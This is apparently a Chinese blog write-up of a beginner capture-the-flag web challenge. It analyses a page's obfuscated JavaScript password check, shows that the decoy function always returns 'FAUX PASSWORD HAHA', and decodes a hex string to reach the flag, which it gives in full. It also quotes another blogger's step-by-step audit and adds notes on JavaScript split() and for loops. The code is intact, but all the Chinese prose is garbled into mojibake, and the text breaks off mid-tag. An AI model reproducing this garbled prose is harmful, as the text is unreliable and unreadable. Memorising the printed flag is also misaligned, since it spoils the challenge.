<p>æˆ‘ä»¬F12æŠŠå®ƒæºç æ‹¿å‡ºæ¥åˆ†æä¸€ä¸‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>JS<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">dechiffre</span>(<span class="params">pass_enc</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> pass = <span class="string">&quot;70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> tab  = pass_enc.<span class="title function_">split</span>(<span class="string">&#x27;,&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> tab2 = pass.<span class="title function_">split</span>(<span class="string">&#x27;,&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> i,j,k,l=<span class="number">0</span>,m,n,o,p = <span class="string">&quot;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        i = <span class="number">0</span>;</span></span><br><span class="line"><span class="language-javascript">        j = tab.<span class="property">length</span>;</span></span><br><span class="line"><span class="language-javascript">        k = j + (l) + (n=<span class="number">0</span>);</span></span><br><span class="line"><span class="language-javascript">        n = tab2.<span class="property">length</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">for</span>(i = (o=<span class="number">0</span>); i &lt; (k = j = n); i++ )</span></span><br><span class="line"><span class="language-javascript">    &#123;o = tab[i-l];p += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>((o = tab2[i]));</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">if</span>(i == <span class="number">5</span>)<span class="keyword">break</span>;&#125;</span></span><br><span class="line"><span class="language-javascript">               <span class="keyword">for</span>(i = (o=<span class="number">0</span>); i &lt; (k = j = n); i++ )</span></span><br><span class="line"><span class="language-javascript">               &#123;</span></span><br><span class="line"><span class="language-javascript">                   o = tab[i-l];</span></span><br><span class="line"><span class="language-javascript">                   <span class="keyword">if</span>(i &gt; <span class="number">5</span> &amp;&amp; i &lt; k-<span class="number">1</span>)</span></span><br><span class="line"><span class="language-javascript">                   p += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>((o = tab2[i]));</span></span><br><span class="line"><span class="language-javascript">               &#125;</span></span><br><span class="line"><span class="language-javascript">        p += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(tab2[<span class="number">17</span>]);</span></span><br><span class="line"><span class="language-javascript">        pass = p;<span class="keyword">return</span> pass;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">String</span>[<span class="string">&quot;fromCharCode&quot;</span>](<span class="title function_">dechiffre</span>(<span class="string">&quot;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&quot;</span>));</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    h = <span class="variable language_">window</span>.<span class="title function_">prompt</span>(<span class="string">&#x27;Enter password&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">alert</span>( <span class="title function_">dechiffre</span>(h) );</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">   </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>æˆ‘ä»¬çœ‹åˆ°å¼€å¤´ä¸€å¤§ä¸²ä»£ç å…ˆä¸ç€æ€¥ï¼ŒæŒ¨ä¸ªåˆ†æ</p>
<p>æœ€æ˜¾çœ¼çš„å°±æ˜¯è¿™ä¸²16è¿›åˆ¶ç </p>
<p><code>\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30</code></p>
<p>æˆ‘ä»¬å¯ä»¥å…ˆç”¨python ç›´æ¥è¾“å‡ºï¼Œå¾—åˆ°10è¿›åˆ¶</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220624223640446.png" alt="image-20220624223640446"></p>
<p>è¿™é‡Œæˆ‘ä»¬æŠŠè¿™ä¸²10è¿›åˆ¶æ•°æŒ‰asciiç è½¬åŒ–ä¸ºå­—ç¬¦ä¸²</p>
<p>786OsErtk12</p>
<p>æŒ‰æè¿°å¡«å†™ </p>
<p>å¾—åˆ°flag : Cyberpeace{786OsErtk12}</p>
<hr>
<p>æˆ‘å¯¹ä»£ç å®¡è®¡è¿˜ä¸å¤ªç†Ÿæ‚‰ï¼Œä¸‹é¢å¼•ç”¨ä¸€ç¯‡å¤§ä½¬çš„ä»£ç å®¡è®¡</p>
<p><a href="https://blog.csdn.net/qq_41617034/article/details/91490695">https://blog.csdn.net/qq_41617034/article/details/91490695</a></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="WREN"><figure class="iseeu highlight /wren"><table><tr><td class="code"><pre><span class="line">æ‰§è¡Œæµç¨‹ï¼š</span><br><span class="line">ä¸€ã€é¦–å…ˆå®šä¹‰äº†ä¸€ä¸ª<span class="variable">dechiffre</span>å‡½æ•°ï¼Œå’±å…ˆä¸ç®¡ï¼Œå› ä¸ºè¿˜æ²¡æœ‰è°ƒç”¨</span><br><span class="line">æ³¨ï¼šå…ˆå°†\<span class="variable">x35</span>\<span class="variable">x35</span>\<span class="variable">x2c</span>\<span class="variable">x35</span>\<span class="variable">x36</span>\<span class="variable">x2c</span>\<span class="variable">x35</span>\<span class="variable">x34</span>\<span class="variable">x2c</span>\<span class="variable">x37</span>\<span class="variable">x39</span>\<span class="variable">x2c</span>\<span class="variable">x31</span>\<span class="variable">x31</span>\<span class="variable">x35</span>\<span class="variable">x2c</span>\<span class="variable">x36</span>\<span class="variable">x39</span>\<span class="variable">x2c</span>\<span class="variable">x31</span>\<span class="variable">x31</span>\<span class="variable">x34</span>\<span class="variable">x2c</span>\<span class="variable">x31</span>\<span class="variable">x31</span>\<span class="variable">x36</span>\<span class="variable">x2c</span>\<span class="variable">x31</span>\<span class="variable">x30</span>\<span class="variable">x37</span>\<span class="variable">x2c</span>\<span class="variable">x34</span>\<span class="variable">x39</span>\<span class="variable">x2c</span>\<span class="variable">x35</span>\<span class="variable">x30</span>åå…­è¿›åˆ¶æ•°è½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œ<span class="variable">python</span>ä¸‹<span class="variable">print</span>å³å¯ï¼Œæˆ–ç½‘å€ï¼š<span class="variable">https</span>:<span class="comment">//www.bejson.com/convert/ox2str/</span></span><br><span class="line">è¾“å‡ºç»“æœ<span class="number">55</span>,<span class="number">56</span>,<span class="number">54</span>,<span class="number">79</span>,<span class="number">115</span>,<span class="number">69</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">107</span>,<span class="number">49</span>,<span class="number">50</span></span><br><span class="line"></span><br><span class="line">äºŒã€æ‰§è¡Œ<span class="title class_">String</span>[<span class="string">&quot;fromCharCode&quot;</span>](<span class="title function_">dechiffre</span>(<span class="string">&quot;55,56,54,79,115,69,114,116,107,49,50</span></span><br><span class="line"><span class="string">&quot;</span>));</span><br><span class="line"></span><br><span class="line">ä¸‰ã€è°ƒç”¨äº†<span class="variable">dechiffre</span>ï¼Œæ‰§è¡Œ<span class="variable">dechiffre</span>å‡½æ•°</span><br><span class="line"><span class="title class_">String</span>[<span class="string">&quot;fromCharCode&quot;</span>](<span class="title function_">dechiffre</span>(<span class="string">&quot;55,56,54,79,115,69,114,116,107,49,50</span></span><br><span class="line"><span class="string">&quot;</span>));</span><br><span class="line">(<span class="number">1</span>)å…ˆå°†<span class="string">&quot;55,56,54,79,115,69,114,116,107,49,50</span></span><br><span class="line"><span class="string">&quot;</span>å¸¦å…¥<span class="variable">dechiffre</span>å‡½æ•°æ‰§è¡Œï¼Œå³<span class="title function_">dechiffre</span>(<span class="variable">pass_enc</span>)<span class="operator">=</span><span class="title function_">dechiffre</span>(<span class="string">&quot;55,56,54,79,115,69,114,116,107,49,50</span></span><br><span class="line"><span class="string">&quot;</span>)</span><br><span class="line"></span><br><span class="line">(<span class="number">2</span>)æ¥ç€æˆ‘ä»¬çœ‹åˆ°äº†<span class="variable">pass</span>å˜é‡ï¼Œæš‚æ—¶å…ˆæ”¾ç€</span><br><span class="line"></span><br><span class="line">(<span class="number">3</span>)å› ä¸º<span class="variable">pass_enc</span><span class="operator">=</span><span class="string">&quot;55,56,54,79,115,69,114,116,107,49,50&quot;</span></span><br><span class="line">å°†<span class="variable">pass_enc</span>å­—ç¬¦ä¸²åˆ†å‰²æˆå­—ç¬¦ä¸²æ•°ç»„ï¼Œèµ‹å€¼ç»™<span class="variable">tab</span>å‚æ•°ï¼Œæ‰€ä»¥ï¼š</span><br><span class="line"><span class="variable">tab</span><span class="operator">=</span>[<span class="number">55</span>,<span class="number">56</span>,<span class="number">54</span>,<span class="number">79</span>,<span class="number">115</span>,<span class="number">69</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">107</span>,<span class="number">49</span>,<span class="number">50</span>]   æ³¨ï¼š<span class="variable">tab</span>æ­¤æ—¶æ˜¯å­—ç¬¦ä¸²æ•°ç»„ï¼ï¼ï¼</span><br><span class="line"></span><br><span class="line">(<span class="number">3</span>)éšåä¹Ÿå¯¹<span class="variable">pass</span>åˆ†å‰²</span><br><span class="line"><span class="variable">tab2</span><span class="operator">=</span>[<span class="number">70</span>,<span class="number">65</span>,<span class="number">85</span>,<span class="number">88</span>,<span class="number">32</span>,<span class="number">80</span>,<span class="number">65</span>,<span class="number">83</span>,<span class="number">83</span>,<span class="number">87</span>,<span class="number">79</span>,<span class="number">82</span>,<span class="number">68</span>,<span class="number">32</span>,<span class="number">72</span>,<span class="number">65</span>,<span class="number">72</span>,<span class="number">65</span>]</span><br><span class="line"></span><br><span class="line">(<span class="number">4</span>)å˜é‡èµ‹å€¼ä»£ç åˆ†æï¼š<span class="keyword">var</span> <span class="variable">i</span>,<span class="variable">j</span>,<span class="variable">k</span>,<span class="variable">l</span><span class="operator">=</span><span class="number">0</span>,<span class="variable">m</span>,<span class="variable">n</span>,<span class="variable">o</span>,<span class="variable">p</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;<span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;<span class="variable">j</span> <span class="operator">=</span> <span class="variable">tab</span>.<span class="property">length</span>;</span><br><span class="line">ä¸€å¼€å§‹<span class="variable">i</span>,<span class="variable">j</span>,<span class="variable">k</span>,<span class="variable">m</span>,<span class="variable">n</span>,<span class="variable">o</span>,æ²¡æœ‰èµ‹å€¼ï¼Œä¸º<span class="variable">undefined</span>ï¼Œå…¶å®ƒå‚æ•°<span class="variable">l</span><span class="operator">=</span><span class="number">0</span>ï¼Œ<span class="variable">p</span><span class="operator">=</span><span class="string">&quot;&quot;</span>ï¼Œåæ¥<span class="variable">i</span>è¢«èµ‹å€¼<span class="operator">=</span><span class="number">0</span>ï¼Œ<span class="variable">j</span>è¢«èµ‹å€¼ä¸º<span class="number">11</span></span><br><span class="line"></span><br><span class="line">(<span class="number">5</span>)ç¬¬ä¹è¡Œæ­¤æ—¶<span class="variable">n</span>è¢«èµ‹å€¼ä¸º<span class="number">0</span>ï¼Œæ‰€ä»¥<span class="variable">k</span><span class="operator">=</span><span class="number">11</span><span class="operator">+</span><span class="number">0</span><span class="operator">+</span><span class="number">0</span>ï¼Œæœ€åç­‰äº<span class="number">11</span>    æ³¨ï¼šè¿™é‡Œçš„(<span class="variable">l</span>)å…¶ä¸­æ˜¯è‹±æ–‡å­—æ¯<span class="variable">l</span>ï¼Œä¸æ˜¯æ•°å­—<span class="number">1</span></span><br><span class="line"></span><br><span class="line">(<span class="number">6</span>)ç¬¬åè¡Œä¸­ï¼Œ<span class="variable">n</span><span class="operator">=</span><span class="number">18</span></span><br><span class="line"></span><br><span class="line">(<span class="number">7</span>)ç¬¬ä¸€ä¸ª<span class="keyword">for</span>å¾ªç¯ï¼Œç²¾ç®€ä¸€ä¸‹ä»£ç ï¼š</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; <span class="variable">i</span> <span class="operator">&lt;</span> (<span class="number">18</span>); <span class="variable">i</span><span class="operator">+</span><span class="operator">+</span> )</span><br><span class="line">&#123;<span class="variable">o</span> <span class="operator">=</span> <span class="variable">tab</span>[<span class="variable">i</span><span class="operator">-</span><span class="variable">l</span>];<span class="variable">p</span> <span class="operator">+</span><span class="operator">=</span> <span class="title class_">String</span>.<span class="property">fromCharCode</span>((<span class="variable">o</span> <span class="operator">=</span> <span class="variable">tab2</span>[<span class="variable">i</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">i</span> <span class="operator">==</span> <span class="number">5</span>)<span class="keyword">break</span>;&#125;</span><br><span class="line">è§£é‡Šï¼šå‰é¢çš„<span class="variable">o</span><span class="operator">=</span><span class="variable">tab</span>[<span class="variable">i</span><span class="number">-1</span>]æ˜¯æ— ç”¨çš„ï¼Œå› ä¸ºåé¢ä¼šè¢«<span class="variable">o</span><span class="operator">=</span><span class="variable">tab2</span>[<span class="variable">i</span>]çš„å€¼é‡æ–°è¦†ç›–</span><br><span class="line">ç¬¬ä¸€æ¬¡å¾ªç¯ï¼š<span class="variable">o</span><span class="operator">=</span><span class="variable">tab</span>[<span class="number">0</span>];<span class="variable">p</span><span class="operator">=</span><span class="variable">p</span><span class="operator">+</span><span class="title class_">String</span>.<span class="property">fromCharCode</span>((<span class="variable">o</span> <span class="operator">=</span> <span class="variable">tab2</span>[<span class="number">0</span>])</span><br><span class="line"><span class="operator">=</span><span class="operator">&gt;</span><span class="variable">o</span><span class="operator">=</span><span class="number">70</span>;<span class="variable">p</span><span class="operator">=</span><span class="string">&quot;&quot;</span><span class="operator">+</span><span class="title class_">String</span>.<span class="property">fromCharCode</span>(<span class="number">70</span>)<span class="operator">=</span><span class="operator">&gt;</span><span class="variable">p</span><span class="operator">=</span>è‹±æ–‡å­—æ¯<span class="variable">F</span></span><br><span class="line">ç¬¬äºŒæ¬¡<span class="operator">...</span></span><br><span class="line">ç¬¬ä¸‰æ¬¡<span class="operator">...</span></span><br><span class="line">ç¬¬å››æ¬¡<span class="operator">...</span></span><br><span class="line">ç¬¬äº”æ¬¡<span class="operator">...</span></span><br><span class="line">æ‰€ä»¥ï¼Œè¿™ä¸ª<span class="keyword">for</span>å¾ªç¯ï¼Œæœ€åçš„<span class="variable">p</span>ä¸ºï¼ˆå°½ç®¡æ²¡æœ‰è¾“å‡ºå‡ºæ¥ï¼Œè¿™é‡Œæˆ‘ä»¬çŸ¥é“å°±å¥½ï¼‰<span class="variable">FAUX</span> <span class="title function_">P</span></span><br><span class="line"></span><br><span class="line">(<span class="number">8</span>)ç¬¬äºŒä¸ª<span class="keyword">for</span>å¾ªç¯ï¼Œç²¾ç®€ä¸€ä¸‹ä»£ç ï¼š</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; <span class="variable">i</span> <span class="operator">&lt;</span> <span class="number">18</span>; <span class="variable">i</span><span class="operator">+</span><span class="operator">+</span> )&#123;</span><br><span class="line"><span class="variable">o</span> <span class="operator">=</span> <span class="variable">tab</span>[<span class="variable">i</span><span class="operator">-</span><span class="variable">l</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">i</span> <span class="operator">&gt;</span> <span class="number">5</span> <span class="operator">&amp;&amp;</span> <span class="variable">i</span> <span class="operator">&lt;</span> <span class="number">17</span>)</span><br><span class="line">        <span class="variable">p</span> <span class="operator">+</span><span class="operator">=</span> <span class="title class_">String</span>.<span class="property">fromCharCode</span>((<span class="variable">o</span> <span class="operator">=</span> <span class="variable">tab2</span>[<span class="variable">i</span>]));</span><br><span class="line">&#125;</span><br><span class="line">è§£é‡Šï¼šè¿™é‡Œçš„<span class="keyword">for</span>å¾ªç¯å’Œä¸Šé¢çš„å·®ä¸å¤šï¼Œæ³¨æ„è¿™é‡Œçš„<span class="variable">p</span>å€¼ç”±äºç¬¬ä¸€æ¬¡<span class="keyword">for</span>å¾ªç¯æ‰§è¡Œåç°åœ¨å·²ç»æ˜¯<span class="variable">FAUX</span> <span class="variable">P</span>äº†</span><br><span class="line">åŠ ä¸Šç¬¬ä¸€æ¬¡<span class="keyword">for</span>å¾ªç¯çš„<span class="variable">p</span>å€¼ï¼Œæœ€åçš„<span class="variable">p</span>ä¸º<span class="variable">FAUX</span> <span class="variable">PASSWORD</span> <span class="title function_">HAH</span></span><br><span class="line"></span><br><span class="line">(<span class="number">9</span>)<span class="variable">p</span> <span class="operator">+</span><span class="operator">=</span> <span class="title class_">String</span>.<span class="property">fromCharCode</span>(<span class="variable">tab2</span>[<span class="number">17</span>]);</span><br><span class="line">å› ä¸º<span class="variable">tab2</span><span class="operator">=</span>[<span class="number">70</span>,<span class="number">65</span>,<span class="number">85</span>,<span class="number">88</span>,<span class="number">32</span>,<span class="number">80</span>,<span class="number">65</span>,<span class="number">83</span>,<span class="number">83</span>,<span class="number">87</span>,<span class="number">79</span>,<span class="number">82</span>,<span class="number">68</span>,<span class="number">32</span>,<span class="number">72</span>,<span class="number">65</span>,<span class="number">72</span>,<span class="number">65</span>]</span><br><span class="line">æ‰€ä»¥ï¼š<span class="variable">p</span><span class="operator">=</span><span class="variable">FAUX</span> <span class="variable">PASSWORD</span> <span class="variable">HAH</span> <span class="operator">+</span> <span class="variable">A</span></span><br><span class="line">å› æ­¤ï¼Œæœ€åçš„<span class="variable">p</span>ä¸º<span class="variable">FAUX</span> <span class="variable">PASSWORD</span> <span class="title function_">HAHA</span></span><br><span class="line"></span><br><span class="line">(<span class="number">10</span>)<span class="variable">pass</span> <span class="operator">=</span> <span class="variable">p</span>;<span class="keyword">return</span> <span class="variable">pass</span>;</span><br><span class="line"> å³ <span class="variable">pass</span> <span class="operator">=</span> <span class="variable">FAUX</span> <span class="variable">PASSWORD</span> <span class="variable">HAHA</span>;<span class="keyword">return</span> <span class="variable">FAUX</span> <span class="variable">PASSWORD</span> <span class="variable">HAHA</span>;</span><br><span class="line"> æœ€åå‡½æ•°è¾“å‡ºä¸º<span class="variable">FAUX</span> <span class="variable">PASSWORD</span> <span class="variable">HAHA</span></span><br><span class="line"></span><br><span class="line">å—¯å“¼ï¼Ÿï¼Ÿï¼Ÿè¿™ä¸ªå‡½æ•°å°±æ‰§è¡Œå®Œäº†ï¼Ÿï¼Ÿï¼Ÿæˆ‘çš„<span class="variable">tab</span>æ•°ç»„æ€ä¹ˆæ²¡æœ‰ç”¨åˆ°ï¼Ÿï¼Ÿï¼Ÿï¼Œæˆ‘ä¸€å¼€å§‹å¸¦è¿›æ¥çš„å‚æ•°å‘¢ï¼Ÿå»å“ªäº†ï¼Ÿåˆ«æƒ³äº†ï¼Œè¾“å‡ºå€¼è™½ç„¶ç”¨åˆ°äº†å¸¦è¿›æ¥çš„å‚æ•°(å°±æ˜¯åˆ†å‰²åçš„<span class="variable">tab</span>æ•°ç»„)ï¼Œä½†æ˜¯<span class="keyword">for</span>å¾ªç¯é‚£é‡Œäººå®¶ç›´æ¥ä½¿ç”¨<span class="variable">tab2</span>æ•°ç»„ç›¸å…³ä»£ç çš„å€¼ï¼Œæ ¹æœ¬æ²¡æœ‰ç”¨åˆ°<span class="variable">tab</span>æ•°ç»„çš„å€¼ï¼Œæ‰€ä»¥ç”±äºä»£ç é€»è¾‘é—®é¢˜ï¼Œä½ ä¼ å…¥çš„<span class="variable">dechiffre</span>çš„å‚æ•°<span class="variable">pass_enc</span>æ˜¯æ²¡æœ‰ä»»ä½•æ„ä¹‰çš„</span><br><span class="line"></span><br><span class="line">ä¸‰ã€<span class="variable">dechiffre</span>å‡½æ•°æ‰§è¡Œå®Œæˆåï¼Œç»§ç»­æ‰§è¡Œå…¶å®ƒçš„ä»£ç </span><br><span class="line"><span class="variable">h</span> <span class="operator">=</span> <span class="variable">window</span>.<span class="property">prompt</span>(&#x27;<span class="title class_">Enter</span> <span class="variable">password</span>&#x27;);</span><br><span class="line">    <span class="title function_">alert</span>( <span class="title function_">dechiffre</span>(<span class="variable">h</span>) );</span><br><span class="line"><span class="variable">h</span><span class="operator">=</span>ä½ è¾“å…¥å¼¹æ¡†å†…çš„å†…å®¹</span><br><span class="line">ä¹‹å<span class="variable">alert</span>å¼¹å‡º<span class="title function_">dechiffre</span>(<span class="variable">h</span>)çš„å€¼ï¼Œç”±å‰é¢æ‰€æœ‰çš„ä»£ç å¯çŸ¥ï¼Œä»£ç é‡Œ<span class="variable">p</span>çš„å€¼ä¸<span class="variable">tab</span>æ— å…³ï¼Œå› ä¸ºæœ€ç»ˆéƒ½ä¼šè¢«<span class="variable">tab2</span>çš„å€¼æ›¿ä»£ï¼Œæ‰€ä»¥æˆ‘ä»¬æ— è®ºè¾“å…¥ä»€ä¹ˆï¼Œä¹Ÿå°±æ˜¯<span class="variable">pass_enc</span><span class="operator">=</span><span class="variable">h</span>ï¼Œæ— è®ºè¾“å…¥çš„è¿™ä¸ª<span class="variable">h</span>ç­‰äºä»€ä¹ˆï¼Œä¸ç®¡<span class="variable">tab</span>èƒ½å¦è¢«åˆ†å‰²æˆå­—ç¬¦ä¸²æ•°ç»„ï¼Œæ˜¯å¦å­˜åœ¨ï¼Œéƒ½åªä¼šåˆ©ç”¨åˆ°<span class="variable">tab2</span>ã€‚é€šä¿—ç‚¹è®²ï¼Œæœ‰å…³<span class="variable">tab</span>çš„å‚æ•°ä¸å€¼éƒ½å¯ä»¥è§†ä¸ºæ²¡æœ‰ï¼Œå› æ­¤ï¼Œ<span class="variable">pass_enc</span>å‚æ•°æ˜¯ä»€ä¹ˆä¹Ÿå°±æ²¡æœ‰æ„ä¹‰äº†</span><br><span class="line"></span><br><span class="line">å››ã€æœ€åï¼Œç»“è®ºå°±æ˜¯ï¼Œæ— è®ºæˆ‘ä»¬åœ¨å¼¹æ¡†ä¸­è¾“å…¥ä»€ä¹ˆå€¼ï¼Œéƒ½åªä¼šè¿”å›<span class="variable">FAUX</span> <span class="variable">PASSWORD</span> <span class="variable">HAHA</span></span><br><span class="line">æˆ‘å°±çŒœæƒ³ï¼Œä¼šä¸ä¼š<span class="title class_">String</span>[<span class="string">&quot;fromCharCode&quot;</span>](<span class="title function_">dechiffre</span>(<span class="string">&quot;<span class="char escape_">\x35</span><span class="char escape_">\x35</span>\x2c<span class="char escape_">\x35</span><span class="char escape_">\x36</span>\x2c<span class="char escape_">\x35</span><span class="char escape_">\x34</span>\x2c<span class="char escape_">\x37</span><span class="char escape_">\x39</span>\x2c<span class="char escape_">\x31</span><span class="char escape_">\x31</span><span class="char escape_">\x35</span>\x2c<span class="char escape_">\x36</span><span class="char escape_">\x39</span>\x2c<span class="char escape_">\x31</span><span class="char escape_">\x31</span><span class="char escape_">\x34</span>\x2c<span class="char escape_">\x31</span><span class="char escape_">\x31</span><span class="char escape_">\x36</span>\x2c<span class="char escape_">\x31</span><span class="char escape_">\x30</span><span class="char escape_">\x37</span>\x2c<span class="char escape_">\x34</span><span class="char escape_">\x39</span>\x2c<span class="char escape_">\x35</span><span class="char escape_">\x30</span>&quot;</span>));è¿™ä¸ªè¯­æ³•é”™è¯¯ï¼Œå¹¶ä¸”æ²¡æœ‰æ²¡è®¡ç®—å‡ºæ¥çš„æ˜¯ä¸æ˜¯æœ€åæ­£ç¡®çš„å€¼ï¼Œä¹Ÿå°±æ˜¯<span class="variable">flag</span><span class="operator">~</span></span><br><span class="line">äºæ˜¯ï¼Œæˆ‘ä¸ç”¨å®ƒè¿™ä¹ˆæ— è®º<span class="variable">pass_enc</span>å‚æ•°è¾“å…¥ä»€ä¹ˆéƒ½æ˜¾ç¤º<span class="variable">FAUX</span> <span class="variable">PASSWORD</span> <span class="variable">HAHA</span>çš„å‡½æ•°ï¼Œå’±ä¹ŸæŠ›å¼ƒå®ƒä¸€å›ï¼Œè‡ªå·±é‡æ–°å†™ä»£ç æ‰§è¡Œå®ƒ</span><br><span class="line"><span class="operator">&lt;</span><span class="operator">!</span><span class="variable">DOCTYPE</span> <span class="variable">html</span><span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span><span class="variable">html</span><span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span><span class="variable">head</span><span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span><span class="variable">meta</span> <span class="variable">charset</span><span class="operator">=</span><span class="string">&quot;utf-8&quot;</span><span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span>/<span class="variable">head</span><span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span><span class="variable">body</span><span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span><span class="variable">script</span><span class="operator">&gt;</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">n</span><span class="operator">=</span><span class="title class_">String</span>.<span class="property">fromCharCode</span>(<span class="number">55</span>,<span class="number">56</span>,<span class="number">54</span>,<span class="number">79</span>,<span class="number">115</span>,<span class="number">69</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">107</span>,<span class="number">49</span>,<span class="number">50</span>);</span><br><span class="line">    <span class="variable">document</span>.<span class="property">write</span>(<span class="variable">n</span>);</span><br><span class="line"><span class="operator">&lt;</span>/<span class="variable">script</span><span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span>/<span class="variable">body</span><span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span>/<span class="variable">html</span><span class="operator">&gt;</span></span><br><span class="line">æœ€åç»“æœä¸ºï¼š<span class="number">786</span>OsErtk12</span><br><span class="line">æ ¹æ®æç¤ºçš„<span class="variable">flag</span>æ ¼å¼è¾“å…¥æœ€åçš„<span class="variable">flag</span>ï¼</span><br></pre></td></tr></table></figure></div>

<p>æ³¨ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MAXIMA"><figure class="iseeu highlight /maxima"><table><tr><td class="code"><pre><span class="line">(<span class="number">1</span>)<span class="built_in">split</span>() æ–¹æ³•ç”¨äºæŠŠä¸€ä¸ªå­—ç¬¦ä¸²åˆ†å‰²æˆå­—ç¬¦ä¸²æ•°ç»„</span><br><span class="line">è¯­æ³•ï¼š<span class="built_in">string</span>.<span class="built_in">split</span>(separator,<span class="built_in">limit</span>)</span><br><span class="line">å‚æ•°                 æè¿°</span><br><span class="line">separator        å¯é€‰ã€‚å­—ç¬¦ä¸²æˆ–æ­£åˆ™è¡¨è¾¾å¼ï¼Œä»è¯¥å‚æ•°æŒ‡å®šçš„åœ°æ–¹åˆ†å‰² <span class="built_in">string</span> Objectã€‚æ¯”å¦‚æ­¤é¢˜ä»¥é€—å·åˆ†å‰²æˆå­—ç¬¦ä¸²æ•°ç»„</span><br><span class="line"><span class="built_in">limit</span>            å¯é€‰ã€‚è¯¥å‚æ•°å¯æŒ‡å®šè¿”å›çš„æ•°ç»„çš„æœ€å¤§é•¿åº¦ã€‚å¦‚æœè®¾ç½®äº†è¯¥å‚æ•°ï¼Œè¿”å›çš„å­ä¸²ä¸ä¼šå¤šäºè¿™ä¸ªå‚æ•°æŒ‡å®šçš„æ•°ç»„ã€‚å¦‚æœæ²¡æœ‰è®¾ç½®è¯¥å‚æ•°ï¼Œæ•´ä¸ªå­—ç¬¦ä¸²éƒ½ä¼šè¢«åˆ†å‰²ï¼Œä¸è€ƒè™‘å®ƒçš„é•¿åº¦ã€‚</span><br><span class="line">ä¸¾ä¾‹ï¼šstr=<span class="string">&quot;a,b,c,d,e,f,g&quot;</span>;</span><br><span class="line"><span class="built_in">var</span> 1st = str.<span class="built_in">split</span>(<span class="string">&quot;,&quot;</span>,<span class="number">3</span>);   å¯¹strä»¥é€—å·è¿›è¡Œåˆ†å‰²ï¼Œåˆ†å‰²åçš„å­—ç¬¦ä¸²æ•°ç»„å†…çš„å€¼æœ€å¤šåªèƒ½æœ‰<span class="number">3</span>ä¸ªï¼Œç»“æœå°±æ˜¯1st = [a,b,c]</span><br><span class="line"></span><br><span class="line">(<span class="number">2</span>)<span class="keyword">for</span> å¾ªç¯çš„è¯­æ³•å¦‚ä¸‹ï¼š</span><br><span class="line"><span class="keyword">for</span> (è¯­å¥ <span class="number">1</span>; è¯­å¥ <span class="number">2</span>; è¯­å¥ <span class="number">3</span>) &#123;</span><br><span class="line">     è¦æ‰§è¡Œçš„ä»£ç å—</span><br><span class="line">&#125;</span><br><span class="line">è¯­å¥ <span class="number">1</span> åœ¨å¾ªç¯ï¼ˆä»£ç å—ï¼‰å¼€å§‹ä¹‹å‰æ‰§è¡Œã€‚</span><br><span class="line">è¯­å¥ <span 